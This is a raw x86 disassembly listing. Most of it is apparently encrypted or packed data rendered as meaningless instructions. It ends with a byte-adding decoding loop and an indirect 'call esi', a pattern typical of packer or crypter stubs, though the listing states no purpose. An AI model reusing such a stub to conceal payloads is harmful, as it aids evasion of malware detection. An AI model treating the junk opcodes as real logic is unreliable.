  41638c:	push   esi
  41638d:	xor    al,0x2d
  41638f:	mov    dh,0x40
  416391:	repz jbe 0x41631b
  416394:	ret    0x233b
  416397:	icebp  
  416398:	shl    BYTE PTR [eax+0x139d0da8],1
  41639e:	scas   al,BYTE PTR es:[edi]
  41639f:	add    eax,0x80eb3804
  4163a4:	clc    
  4163a5:	inc    esp
  4163a6:	push   eax
  4163a7:	mov    ch,0x46
  4163a9:	lds    esi,FWORD PTR [esi]
  4163ab:	or     esi,eax
  4163ad:	add    DWORD PTR [ebp-0x41],ecx
  4163b0:	sti    
  4163b1:	dec    si
  4163b3:	fcomip st,st(5)
  4163b5:	fmul   DWORD PTR [ecx-0x4b]
  4163b8:	stos   BYTE PTR es:[edi],al
  4163b9:	adc    ch,dh
  4163bb:	shl    DWORD PTR [edx-0x48],1
  4163be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163bf:	clc    
  4163c0:	int3   
  4163c1:	mov    esp,0x6d3cdbfa
  4163c6:	xchg   ebp,eax
  4163c7:	adc    al,0x1b
  4163c9:	test   dl,bh
  4163cb:	mov    bl,0x23
  4163cd:	xor    edi,eax
  4163cf:	push   ebp
  4163d0:	imul   ebp,esp,0xb8a4acb0
  4163d6:	xchg   esp,eax
  4163d7:	cmp    BYTE PTR [ebp-0x7a749b51],dl
  4163dd:	add    al,0x5
  4163df:	sub    eax,0xc344fabb
  4163e4:	shl    BYTE PTR [ebp-0x3c310fa0],0x68
  4163eb:	inc    ebx
  4163ec:	icebp  
  4163ed:	sub    eax,0xcbf95827
  4163f2:	pop    edx
  4163f3:	lods   al,BYTE PTR ds:[esi]
  4163f4:	dec    ebp
  4163f5:	mov    cl,BYTE PTR [ebp-0x6e]
  4163f8:	ja     0x416455
  4163fa:	shl    BYTE PTR [eax+0x63],cl
  4163fd:	scas   al,BYTE PTR es:[edi]
  4163fe:	sar    DWORD PTR [ebp+edx*1+0x2f215f0d],cl
  416405:	mov    ecx,0x8be35291
  41640a:	data16 mov ?,WORD PTR [ebx]
  41640d:	rcl    DWORD PTR [ebp-0x55ca7f9],0xb3
  416414:	ins    DWORD PTR es:[edi],dx
  416415:	hlt    
  416416:	pop    esi
  416417:	and    al,0x3
  416419:	les    eax,FWORD PTR [esi+eax*1-0x1238a7]
  416420:	push   esp
  416421:	lea    ebp,ds:0xd2115e05
  416427:	inc    ecx
  416428:	jecxz  0x4163c9
  41642a:	push   ecx
  41642b:	fisttp QWORD PTR [eax-0x6393c419]
  416431:	and    al,0xd6
  416433:	repnz push edx
  416435:	js     0x41648e
  416437:	or     ebp,DWORD PTR [eiz*2+0xc2c8b85]
  41643e:	or     BYTE PTR [edi],ch
  416440:	in     al,dx
  416441:	sub    BYTE PTR [ecx],bl
  416443:	add    ebx,DWORD PTR fs:0x3edfb868
  41644a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41644b:	adc    bl,BYTE PTR [esi+0xc61af25]
  416451:	mov    esi,DWORD PTR [esi+0x34e8eea3]
  416457:	cli    
  416458:	dec    esp
  416459:	clc    
  41645a:	shr    esi,1
  41645c:	call   0x40a3017b
  416461:	adc    DWORD PTR cs:[ebx],ebx
  416464:	sbb    bl,BYTE PTR fs:[edx+ecx*2]
  416468:	sbb    eax,ecx
  41646a:	out    dx,eax
  41646b:	stos   BYTE PTR es:[edi],al
  41646c:	push   esi
  41646d:	xchg   edi,eax
  41646e:	jl     0x416439
  416470:	in     al,0xa7
  416472:	fst    QWORD PTR [edi]
  416474:	xchg   BYTE PTR [ecx],bl
  416476:	call   0x426c:0xefb0b4df
  41647d:	sar    DWORD PTR [ecx],0x20
  416480:	and    al,0x7d
  416482:	(bad)  
  416483:	jmp    0xc0a8:0x865ff06c
  41648a:	scas   eax,DWORD PTR es:[edi]
  41648b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41648c:	popa   
  41648d:	mov    ch,0x4
  41648f:	fwait
  416490:	or     dh,BYTE PTR [esi-0x5b]
  416493:	mov    WORD PTR [eax-0x11],?
  416496:	inc    ebp
  416497:	dec    ebp
  416498:	cmp    BYTE PTR [edi+0x4b2358a6],0xe5
  41649f:	inc    ebp
  4164a0:	mov    edx,0x99de46d8
  4164a5:	arpl   ax,bp
  4164a7:	mov    cl,0x77
  4164a9:	ror    DWORD PTR [ecx+0x2a],cl
  4164ac:	push   ss
  4164ad:	mov    ebp,eax
  4164af:	cmp    al,dl
  4164b1:	cmp    bh,BYTE PTR [edx-0x207e1ad6]
  4164b7:	inc    ebx
  4164b8:	(bad)  
  4164b9:	mov    ch,0xe2
  4164bb:	(bad)  
  4164bc:	sbb    dh,BYTE PTR [ebp-0x3f0503d4]
  4164c2:	jae    0x416534
  4164c4:	push   ds
  4164c5:	cmp    ebp,DWORD PTR [eax+0x22]
  4164c8:	adc    BYTE PTR ds:0xe5bb7ab5,bl
  4164ce:	cmp    al,0x93
  4164d0:	mov    WORD PTR [edi],ss
  4164d2:	xchg   edx,eax
  4164d3:	imul   eax,DWORD PTR [edx-0x667d1096],0x3a
  4164da:	and    al,0xef
  4164dc:	mov    bl,0x7c
  4164de:	lea    edx,[esi-0x387ad43b]
  4164e4:	dec    eax
  4164e5:	enter  0xbd01,0xb2
  4164e9:	mov    BYTE PTR [eax],ch
  4164eb:	inc    ecx
  4164ec:	in     al,dx
  4164ed:	je     0x416540
  4164ef:	and    bh,BYTE PTR [ecx-0x5e8669ac]
  4164f5:	stc    
  4164f6:	mov    al,0xcc
  4164f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164f9:	sub    edx,edi
  4164fb:	mul    DWORD PTR [ebx+0x247184d0]
  416501:	dec    ebx
  416502:	jecxz  0x41652a
  416504:	adc    BYTE PTR [eax],al
  416506:	aas    
  416507:	cmp    edx,DWORD PTR [esi+0x52]
  41650a:	ret    
  41650b:	pop    ss
  41650c:	shr    BYTE PTR [edx-0x26],0xb5
  416510:	mov    ds:0x45a5b5dc,eax
  416515:	push   es
  416516:	addr16 loop 0x416574
  416519:	ret    
  41651a:	call   0x60c6cd2b
  41651f:	xor    BYTE PTR [esi],al
  416521:	clc    
  416522:	xor    ah,ah
  416524:	iret   
  416525:	xor    DWORD PTR [edi],esp
  416527:	jle    0x41652d
  416529:	cli    
  41652a:	or     esi,DWORD PTR [ebp+0x3b556c42]
  416530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416531:	add    BYTE PTR [ecx-0x68a4ffb2],dh
  416537:	mov    ch,0x76
  416539:	inc    edi
  41653a:	into   
  41653b:	and    eax,0x96b8a8eb
  416540:	mov    esp,0x3e5d052c
  416545:	fstp   DWORD PTR ds:0x6a1814e9
  41654b:	mov    esi,0xbdf56e76
  416550:	pop    esi
  416551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416552:	cdq    
  416553:	mov    ecx,0x5103b646
  416558:	call   0x9bd9e462
  41655d:	pop    ebp
  41655e:	(bad)  
  41655f:	loopne 0x4165a5
  416561:	lahf   
  416562:	dec    ecx
  416563:	push   eax
  416564:	gs xchg edi,eax
  416566:	ror    dl,cl
  416568:	(bad)  
  416569:	loop   0x416558
  41656b:	enter  0xd0a8,0x24
  41656f:	in     al,dx
  416570:	std    
  416571:	mov    ch,0x67
  416573:	cld    
  416574:	ret    0x2fbe
  416577:	stos   BYTE PTR es:[edi],al
  416578:	rcr    BYTE PTR [ebp-0x7c645d6c],cl
  41657e:	in     eax,0x75
  416580:	and    eax,0x4383c8ff
  416585:	mov    esi,0x2a302b8c
  41658a:	std    
  41658b:	gs mov ecx,0x7263cc35
  416591:	sbb    BYTE PTR [edi-0x1e],bh
  416594:	ret    
  416595:	data16 jne 0x4165c5
  416598:	call   0x44ce099f
  41659d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41659e:	and    bh,BYTE PTR [ebx+0x28]
  4165a1:	adc    edi,ebx
  4165a3:	lea    edx,[edx]
  4165a5:	jmp    0x4a76:0x481e289a
  4165ac:	xchg   ebp,eax
  4165ad:	out    0x0,al
  4165af:	sahf   
  4165b0:	xor    BYTE PTR [ebx],al
  4165b2:	js     0x41654e
  4165b4:	and    DWORD PTR [ebp+0x21],ebx
  4165b7:	push   eax
  4165b8:	jmp    0x41661f
  4165ba:	in     eax,dx
  4165bb:	add    BYTE PTR [esi-0x11092d73],0x5f
  4165c2:	mov    esp,0xc8dd0dee
  4165c7:	mul    DWORD PTR [esi]
  4165c9:	out    dx,al
  4165ca:	pusha  
  4165cb:	jp     0x4165cc
  4165cd:	ins    DWORD PTR es:[edi],dx
  4165ce:	stc    
  4165cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d0:	push   edx
  4165d1:	sar    al,0x37
  4165d4:	out    0xcd,al
  4165d6:	pop    ecx
  4165d7:	rol    DWORD PTR [ebx],1
  4165d9:	xchg   edi,eax
  4165da:	scas   al,BYTE PTR es:[edi]
  4165db:	push   edi
  4165dc:	js     0x4165ec
  4165de:	push   edi
  4165df:	or     BYTE PTR ds:0xe20cd224,bl
  4165e5:	sub    DWORD PTR [eax+0x31642b7d],esp
  4165eb:	dec    eax
  4165ec:	mov    cl,0xbe
  4165ee:	jb     0x416621
  4165f0:	(bad)  [eax+0x78]
  4165f3:	mov    DWORD PTR [ecx+0x116bd5b5],edx
  4165f9:	push   0xad33eafa
  4165fe:	sbb    al,BYTE PTR [ebx]
  416600:	scas   eax,DWORD PTR es:[edi]
  416601:	and    DWORD PTR [eax],0xe3d711b0
  416607:	sbb    DWORD PTR ds:0x98e55e77,ebp
  41660d:	add    BYTE PTR gs:[ecx-0x5c],bl
  416611:	stos   DWORD PTR es:[edi],eax
  416612:	jbe    0x416626
  416614:	js     0x4165c3
  416616:	mov    al,bh
  416618:	pop    edx
  416619:	push   ecx
  41661a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41661b:	sub    BYTE PTR [edx-0x63e85abf],dl
  416621:	ds xchg ebp,eax
  416623:	sahf   
  416624:	push   ebp
  416625:	xacquire xchg DWORD PTR [ecx-0x2b6ad3fe],ecx
  41662c:	loopne 0x416613
  41662e:	adc    ebx,DWORD PTR [edi]
  416630:	lods   al,BYTE PTR ds:[esi]
  416631:	out    0x65,eax
  416633:	mov    ds:0xde055d90,al
  416638:	sbb    DWORD PTR [eax+0x73],0xb9bb4b57
  41663f:	inc    esp
  416640:	shl    DWORD PTR [edi+0x24c805bc],0xe
  416647:	pop    ebx
  416648:	imul   edx,DWORD PTR [esi+ebx*1+0x2a028936],0xffffffb6
  416650:	imul   edx,DWORD PTR [eax],0xa812f44b
  416656:	pop    edx
  416657:	sub    BYTE PTR [ebx+ecx*8+0x2e],bh
  41665b:	test   BYTE PTR [esi-0x5e],al
  41665e:	int3   
  41665f:	fnstenv [ecx-0x5f17509f]
  416665:	(bad)  
  416666:	jl     0x416685
  416668:	add    eax,0x514f161a
  41666d:	xor    eax,0x2e743468
  416672:	sbb    eax,0xbf341b2f
  416677:	mov    edi,0xa0290aba
  41667c:	(bad)  
  41667d:	mov    DWORD PTR ds:0x1f791390,eax
  416683:	xchg   ecx,eax
  416684:	or     al,0x4f
  416686:	xor    BYTE PTR [esi-0x18],bh
  416689:	ret    0xc5ed
  41668c:	xor    dh,BYTE PTR [esi+0x16]
  41668f:	stos   DWORD PTR es:[edi],eax
  416690:	or     eax,0x131e82b5
  416695:	int3   
  416696:	xchg   ebp,ecx
  416698:	xor    DWORD PTR [edi],ebx
  41669a:	jmp    0xd84321fe
  41669f:	mov    BYTE PTR [ebx-0x32],cl
  4166a2:	and    bh,BYTE PTR [ecx+0x5a]
  4166a5:	xchg   BYTE PTR ds:0x1098b60c,ah
  4166ab:	sub    dh,ah
  4166ad:	clc    
  4166ae:	xchg   edx,eax
  4166af:	retf   
  4166b0:	add    edi,esp
  4166b2:	adc    BYTE PTR [ebx-0x552a5f0e],ah
  4166b8:	lods   al,BYTE PTR ds:[esi]
  4166b9:	sbb    eax,0xa5385df2
  4166be:	shl    DWORD PTR gs:[ebx],cl
  4166c1:	add    DWORD PTR [esi-0x6ad42ed9],eax
  4166c7:	inc    eax
  4166c8:	aad    0xc1
  4166ca:	retf   
  4166cb:	fist   DWORD PTR [edi*1-0x4d784063]
  4166d2:	retf   
  4166d3:	sbb    al,0x8f
  4166d5:	je     0x4166e2
  4166d7:	and    BYTE PTR [ebp-0x14],bl
  4166da:	and    BYTE PTR [esi],ch
  4166dc:	mov    ch,0x12
  4166de:	push   ss
  4166df:	or     eax,0xadfed346
  4166e4:	pop    ebp
  4166e5:	push   0x62
  4166e7:	xchg   esi,eax
  4166e8:	fs pop ebp
  4166ea:	xor    al,0x85
  4166ec:	neg    bl
  4166ee:	cld    
  4166ef:	lds    esi,FWORD PTR [ebp+0x1e43bbb2]
  4166f5:	fdiv   st,st(5)
  4166f7:	in     eax,0x86
  4166f9:	leave  
  4166fa:	test   BYTE PTR [esi-0x1c],al
  4166fd:	and    eax,0xecf1858a
  416702:	cdq    
  416703:	lea    eax,[edi-0x2f84ff77]
  416709:	es add eax,0xb45bc1b3
  41670f:	xchg   esi,eax
  416710:	pop    ds
  416711:	ror    BYTE PTR [esi+0x14],cl
  416714:	adc    eax,0x9a361c3b
  416719:	push   0x698f9480
  41671e:	popa   
  41671f:	or     DWORD PTR [ebx-0x14],0xffffffbb
  416723:	xlat   BYTE PTR ds:[ebx]
  416724:	jnp    0x4167a1
  416726:	pop    eax
  416727:	xchg   edi,eax
  416728:	stos   DWORD PTR es:[edi],eax
  416729:	pusha  
  41672a:	xor    al,0xc8
  41672c:	push   ebp
  41672d:	lahf   
  41672e:	mov    dh,0xa1
  416730:	add    BYTE PTR [edx],dl
  416732:	fwait
  416733:	lods   al,BYTE PTR ds:[esi]
  416734:	lods   eax,DWORD PTR ds:[esi]
  416735:	push   es
  416736:	sub    eax,0x556530b6
  41673b:	inc    esp
  41673c:	xor    eax,0xe67c014
  416741:	xchg   ebx,eax
  416742:	mov    edx,0x77add09
  416747:	enter  0x948d,0xa6
  41674b:	xor    BYTE PTR [ebp-0x23091c9],dl
  416751:	push   edi
  416752:	fmul   QWORD PTR [eax+eax*4]
  416755:	mov    esi,0x1f665d9b
  41675a:	scas   al,BYTE PTR es:[edi]
  41675b:	daa    
  41675c:	pop    ecx
  41675d:	sbb    bl,BYTE PTR [esi-0x5]
  416760:	cmp    DWORD PTR [edx],ebx
  416762:	int3   
  416763:	in     eax,0x9f
  416765:	cmp    eax,0xd59cea2b
  41676a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41676b:	mov    al,ds:0x515e9ead
  416770:	jmp    0x6fca5b6f
  416775:	and    al,0xa2
  416777:	pop    si
  416779:	int    0x65
  41677b:	inc    eax
  41677c:	jbe    0x416799
  41677e:	stos   DWORD PTR es:[edi],eax
  41677f:	test   al,0xbb
  416781:	push   eax
  416782:	addr16 mov ?,edx
  416785:	push   es
  416786:	inc    eax
  416787:	jae    0x4167b1
  416789:	jne    0x41672c
  41678b:	aas    
  41678c:	imul   edi,DWORD PTR ds:0x1376dd6b,0xf7e2ab1f
  416796:	retf   
  416797:	sbb    DWORD PTR [esi-0x6be76698],0x4f
  41679e:	loope  0x41673f
  4167a0:	push   ebp
  4167a1:	fist   DWORD PTR [ebp-0x36]
  4167a4:	sahf   
  4167a5:	xchg   ebx,eax
  4167a6:	mul    BYTE PTR [esi-0x4a80d3f8]
  4167ac:	pop    esi
  4167ad:	inc    esi
  4167ae:	jno    0x4167b9
  4167b0:	or     bh,BYTE PTR [edx]
  4167b2:	arpl   WORD PTR [edx+0x18],bp
  4167b5:	(bad)  [esi+0x1fd8d438]
  4167bb:	sbb    al,0xde
  4167bd:	cld    
  4167be:	(bad)  
  4167bf:	sub    ah,BYTE PTR [ebx+0x60]
  4167c2:	xchg   edi,eax
  4167c3:	jecxz  0x4167e9
  4167c5:	jno    0x416830
  4167c7:	jle    0x4167c2
  4167c9:	ret    0xa952
  4167cc:	xchg   esp,eax
  4167cd:	and    ecx,DWORD PTR [edi-0x54]
  4167d0:	arpl   cx,dx
  4167d2:	arpl   WORD PTR [ebx+eax*1],ax
  4167d5:	adc    al,0x1a
  4167d7:	bnd jae 0x416803
  4167da:	nop
  4167db:	push   edx
  4167dc:	push   edx
  4167dd:	retf   
  4167de:	aaa    
  4167df:	push   ebp
  4167e0:	call   0xc8ec:0x5f464d01
  4167e7:	imul   BYTE PTR [ebx]
  4167e9:	jno    0x4167aa
  4167eb:	mov    eax,ds:0x452881e2
  4167f0:	bound  edi,QWORD PTR [edx-0x692e0c1c]
  4167f6:	jp     0x4167ad
  4167f8:	pop    ebx
  4167f9:	mov    al,ds:0xe5b1061a
  4167fe:	add    BYTE PTR [edx-0xd],al
  416801:	repz lahf 
  416803:	push   edx
  416804:	xchg   ebx,eax
  416805:	push   ss
  416806:	shl    BYTE PTR [eax+0x3a2f4e33],cl
  41680c:	loop   0x4167fd
  41680e:	xchg   esp,eax
  41680f:	neg    BYTE PTR [esi+ebx*2+0x4fa8bdd]
  416816:	test   eax,0x2aa7823a
  41681b:	and    eax,0x72ce0591
  416820:	and    BYTE PTR [edi+0x5b],0x5b
  416824:	fwait
  416825:	sub    BYTE PTR [esi],dh
  416827:	loopne 0x4167bf
  416829:	pop    edi
  41682a:	dec    eax
  41682b:	xor    ebx,DWORD PTR [edi-0x3378deb2]
  416831:	cdq    
  416832:	jo     0x41686c
  416834:	loope  0x4167c6
  416836:	lods   eax,DWORD PTR ds:[esi]
  416837:	fsub   QWORD PTR [edx]
  416839:	push   eax
  41683a:	popa   
  41683b:	inc    ecx
  41683c:	xchg   BYTE PTR [esi],al
  41683e:	mov    DWORD PTR [ecx+0x61],edi
  416841:	add    cl,ah
  416843:	mov    dl,0xd5
  416845:	ret    
  416846:	push   edx
  416847:	and    esp,ebp
  416849:	outs   dx,DWORD PTR ds:[esi]
  41684a:	sbb    DWORD PTR ds:0xa2f57fe9,ebx
  416850:	loop   0x416833
  416852:	jns    0x4168a8
  416854:	jbe    0x416841
  416856:	inc    eax
  416857:	sbb    dl,BYTE PTR [esi-0x49]
  41685a:	sbb    eax,0x89ddfaa3
  41685f:	or     esi,DWORD PTR [ecx-0x4470732b]
  416865:	gs pop edi
  416867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416868:	clc    
  416869:	mov    al,0x34
  41686b:	test   eax,0x56f2f783
  416870:	sub    al,0x6
  416872:	pop    edx
  416873:	fdivr  st,st(0)
  416875:	jl     0x416867
  416877:	scas   eax,DWORD PTR es:[edi]
  416878:	xchg   ebx,eax
  416879:	mov    eax,0x2418812d
  41687e:	fld    DWORD PTR [edx]
  416880:	dec    ecx
  416881:	hlt    
  416882:	loopne 0x4168d0
  416884:	and    bh,ch
  416886:	test   al,0x50
  416888:	or     al,0x1e
  41688a:	loopne 0x4168a9
  41688c:	adc    dl,al
  41688e:	dec    esp
  41688f:	mov    ebp,0xc5d5c4b9
  416894:	pop    ecx
  416895:	or     edi,DWORD PTR [esi-0x4a2dcd7e]
  41689b:	mov    ?,WORD PTR [edi]
  41689d:	fist   DWORD PTR [esi-0x8]
  4168a0:	rsm    
  4168a2:	test   al,0xd
  4168a4:	jnp    0x41688a
  4168a6:	leave  
  4168a7:	jmp    0x4f9f6b52
  4168ac:	add    BYTE PTR [ebp+0x6e3cb15c],ah
  4168b2:	push   cs
  4168b3:	pop    ss
  4168b4:	xor    bl,BYTE PTR [eax-0x2c]
  4168b7:	inc    ebx
  4168b8:	popa   
  4168b9:	adc    eax,0xf85fe237
  4168be:	ficom  DWORD PTR [edx]
  4168c0:	(bad)  
  4168c1:	cld    
  4168c2:	dec    eax
  4168c3:	xchg   DWORD PTR [edi-0x2d],eax
  4168c6:	pushf  
  4168c7:	jne    0x4168e6
  4168c9:	pop    esp
  4168ca:	mov    edx,0x5092102
  4168cf:	icebp  
  4168d0:	pop    esi
  4168d1:	les    eax,FWORD PTR [ecx+0x42e64887]
  4168d7:	aam    0x75
  4168d9:	fisttp DWORD PTR [edx+0x2d1f2e24]
  4168df:	fcmovb st,st(5)
  4168e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168e2:	retf   
  4168e3:	mov    BYTE PTR [ebx-0x68],ah
  4168e6:	aam    0xa8
  4168e8:	div    ah
  4168ea:	push   ecx
  4168eb:	or     dl,bh
  4168ed:	cmp    DWORD PTR [ebx+0x17],ecx
  4168f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168f1:	jmp    0x41687a
  4168f3:	cmp    ebp,DWORD PTR ds:0xfb76966c
  4168f9:	leave  
  4168fa:	inc    BYTE PTR [edx]
  4168fc:	inc    ebx
  4168fd:	fstp   TBYTE PTR [edx]
  4168ff:	stc    
  416900:	jne    0x41691e
  416902:	ins    DWORD PTR es:[edi],dx
  416903:	je     0x416972
  416905:	inc    ebx
  416906:	xor    bh,BYTE PTR [ecx]
  416908:	fcomip st,st(5)
  41690a:	jg     0x416907
  41690c:	into   
  41690d:	cmc    
  41690e:	cmc    
  41690f:	add    eax,0x67a24e3a
  416914:	icebp  
  416915:	mov    bh,0xd5
  416917:	and    bl,BYTE PTR [ebx+0x5b1af0ad]
  41691d:	sbb    al,cl
  41691f:	jmp    eax
  416921:	outs   dx,BYTE PTR ds:[esi]
  416922:	call   0xea313297
  416927:	pop    edi
  416928:	rcl    eax,cl
  41692a:	mov    dh,0xa5
  41692c:	mov    ah,0xb1
  41692e:	mov    al,BYTE PTR [edi+0x3082a83d]
  416934:	pop    ebx
  416935:	mov    ebx,0xcde08bce
  41693a:	and    DWORD PTR [ecx+0xc],edx
  41693d:	sub    DWORD PTR [eax+ebp*1-0x6efabaa4],eax
  416944:	clc    
  416945:	xchg   BYTE PTR [eax+0x63c43600],ah
  41694b:	or     eax,0x9ba1e984
  416950:	add    BYTE PTR [edi],bh
  416952:	test   eax,0x4b4835e7
  416957:	cmp    esi,DWORD PTR [edx+0x26]
  41695a:	out    0x19,al
  41695c:	dec    ecx
  41695d:	cs dec esp
  41695f:	test   eax,0x3475133
  416964:	(bad)  
  416967:	fdivr  st(0),st
  416969:	js     0x41699b
  41696b:	dec    eax
  41696c:	pop    edi
  41696d:	push   esp
  41696e:	fcom   st(7)
  416970:	mov    edi,0xd9c8a3d1
  416975:	popf   
  416976:	icebp  
  416977:	sub    esi,ebx
  416979:	or     eax,0x7ffa9f94
  41697e:	ret    0x1ddc
  416981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416982:	jnp    0x4169e8
  416984:	popa   
  416985:	icebp  
  416986:	xchg   DWORD PTR [edx+0x7a],ecx
  416989:	sbb    eax,0x38df4774
  41698e:	jg     0x41691b
  416990:	jne    0x41698e
  416992:	call   esi
  416994:	mov    DWORD PTR [ebp-0x38],eax
  416997:	cmp    DWORD PTR [ebp-0x38],0x57
  41699b:	jne    0x4169a9
  41699d:	mov    edx,DWORD PTR [ebp-0x20]
  4169a0:	push   edx
  4169a1:	call   0x401000
  4169a6:	add    esp,0x4
  4169a9:	xor    eax,eax
  4169ab:	pop    esi
  4169ac:	mov    esp,ebp
  4169ae:	pop    ebp
  4169af:	ret    
  4169b0:	push   ebp
  4169b1:	mov    ebp,esp
  4169b3:	sub    esp,0x124
  4169b9:	xor    eax,eax
  4169bb:	mov    esp,ebp
  4169bd:	pop    ebp
  4169be:	ret    
  4169bf:	push   ebp
  4169c0:	mov    ebp,esp
  4169c2:	sub    esp,0x2c
  4169c5:	push   ebx
  4169c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4169cd:	mov    DWORD PTR [ebp-0xc],0x0
  4169d4:	mov    DWORD PTR [ebp-0x20],0x1
  4169db:	mov    DWORD PTR [ebp-0x10],0x0
  4169e2:	mov    eax,DWORD PTR [ebp+0xc]
  4169e5:	mov    DWORD PTR [ebp-0x1c],eax
  4169e8:	mov    DWORD PTR [ebp-0x18],0x0
  4169ef:	mov    DWORD PTR [ebp-0x8],0x0
  4169f6:	mov    DWORD PTR [ebp-0x24],0x0
  4169fd:	mov    ecx,DWORD PTR [ebp-0x4]
  416a00:	sub    ecx,0x1
  416a03:	mov    DWORD PTR [ebp-0x4],ecx
  416a06:	mov    edx,DWORD PTR [ebp+0x8]
  416a09:	mov    DWORD PTR [ebp-0x10],edx
  416a0c:	mov    DWORD PTR [ebp-0x28],0x1
  416a13:	mov    eax,DWORD PTR [ebp-0x4]
  416a16:	add    eax,0x2
  416a19:	mov    DWORD PTR [ebp-0x4],eax
  416a1c:	mov    ecx,DWORD PTR [ebp-0x1c]
  416a1f:	add    ecx,DWORD PTR [ebp-0x4]
  416a22:	mov    dl,BYTE PTR [ecx+0x1]
  416a25:	mov    BYTE PTR [ebp-0x11],dl
  416a28:	mov    eax,DWORD PTR [ebp-0x4]
  416a2b:	add    eax,0x1
  416a2e:	mov    DWORD PTR [ebp-0x4],eax
  416a31:	mov    cl,BYTE PTR [ebp-0x11]
  416a34:	mov    BYTE PTR [ebp-0x29],cl
  416a37:	push   edx
  416a38:	pop    ebx
  416a39:	mov    ecx,ebx
  416a3b:	mov    edx,DWORD PTR [ebp-0x10]
  416a3e:	add    edx,DWORD PTR [ebp-0x4]
  416a41:	mov    al,BYTE PTR [ebp-0x29]
  416a44:	mov    BYTE PTR [edx],al
  416a46:	mov    ebx,esi
  416a48:	mov    ecx,DWORD PTR [ebp+0x14]
  416a4b:	add    ecx,DWORD PTR [ebp-0x8]
  416a4e:	movzx  edx,BYTE PTR [ecx]
  416a51:	mov    DWORD PTR [ebp-0xc],edx
  416a54:	mov    eax,DWORD PTR [ebp-0x8]
  416a57:	mov    ecx,DWORD PTR [ebp-0x28]
  416a5a:	add    eax,ecx
  416a5c:	mov    DWORD PTR [ebp-0x8],eax
  416a5f:	mov    eax,DWORD PTR [ebp-0x8]
  416a62:	shr    eax,0x3
  416a65:	mov    ecx,0x1
  416a6a:	sub    ecx,eax
  416a6c:	mov    DWORD PTR [ebp-0x20],ecx
  416a6f:	shr    eax,cl
  416a71:	mov    edx,DWORD PTR [ebp-0x8]
  416a74:	imul   edx,DWORD PTR [ebp-0x20]
  416a78:	mov    DWORD PTR [ebp-0x8],edx
  416a7b:	shl    ebx,0x3
  416a7e:	mov    eax,DWORD PTR [ebp-0x10]
  416a81:	add    eax,DWORD PTR [ebp-0x4]
  416a84:	movzx  ecx,BYTE PTR [eax]
  416a87:	add    ecx,DWORD PTR [ebp-0xc]
  416a8a:	mov    edx,DWORD PTR [ebp-0x10]
  416a8d:	add    edx,DWORD PTR [ebp-0x4]
  416a90:	mov    BYTE PTR [edx],cl
  416a92:	mov    eax,DWORD PTR [ebp-0x4]
  416a95:	sub    eax,0x2
  416a98:	mov    DWORD PTR [ebp-0x4],eax
  416a9b:	mov    ecx,DWORD PTR [ebp-0x4]
  416a9e:	cmp    ecx,DWORD PTR [ebp+0x10]
  416aa1:	jl     0x416a13
  416aa7:	pop    ebx
  416aa8:	mov    esp,ebp
  416aaa:	pop    ebp
  416aab:	ret    
  416aac:	jmp    DWORD PTR ds:0x417020
